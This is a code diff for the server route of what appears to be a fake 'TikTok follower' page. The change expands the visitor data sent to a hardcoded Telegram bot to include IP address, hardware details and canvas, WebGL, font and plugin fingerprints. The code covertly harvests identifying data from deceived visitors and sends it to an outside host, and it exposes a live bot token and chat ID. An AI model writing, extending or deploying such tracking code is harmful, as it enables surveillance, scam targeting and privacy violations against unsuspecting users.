@@ -16,7 +16,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const TELEGRAM_BOT_TOKEN = "8070873055:AAHRpIvi56j4F2h0BhBA_uB4tyw_SCYMsVM";
       const TELEGRAM_CHAT_ID = "6360165707";
       
-      // Format message with visitor info
+      // Format message with detailed visitor info
       const message = `
 🔥 New TikTok Follower Request 🔥
 👤 Username: @${username}
@@ -24,10 +24,33 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
 📱 Device Info:
 - Screen: ${userInfo.screenSize}
+- Color Depth: ${userInfo.colorDepth}
 - Platform: ${userInfo.platform}
-- Language: ${userInfo.language}
+- CPU Cores: ${userInfo.hardwareConcurrency}
+- Memory: ${userInfo.deviceMemory}
+- Cookies: ${userInfo.cookiesEnabled}
+- DNT: ${userInfo.doNotTrack}
+
+🌐 Network:
+- IP Address: ${userInfo.ip}
+- Connection: ${JSON.stringify(userInfo.connection)}
+
+🗣️ Language:
+- Primary: ${userInfo.language}
+- All: ${userInfo.languages}
+
+⏰ Time:
 - Timezone: ${userInfo.timezone}
-- User Agent: ${userInfo.userAgent}
+- Offset: ${userInfo.timezoneOffset}
+
+🔍 Fingerprints:
+- Canvas: ${userInfo.canvasFingerprint || 'Not available'}
+- WebGL: ${userInfo.webglFingerprint || 'Not available'}
+- Fonts: ${userInfo.fonts || 'Not available'}
+- Plugins: ${userInfo.plugins || 'Not available'}
+
+🧩 User Agent:
+${userInfo.userAgent}
       `;
       
       // Send to Telegram
